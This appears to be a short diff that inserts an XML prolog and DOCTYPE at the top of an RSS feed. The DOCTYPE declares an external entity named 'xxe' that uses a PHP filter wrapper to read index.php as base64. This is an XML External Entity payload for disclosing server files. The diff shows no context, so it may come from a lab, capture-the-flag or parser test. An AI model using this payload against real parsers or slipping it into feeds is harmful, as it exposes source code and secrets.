@@ -1,3 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resourse=index.php">
+]>
 <rss version="2.0">
 
 <channel>
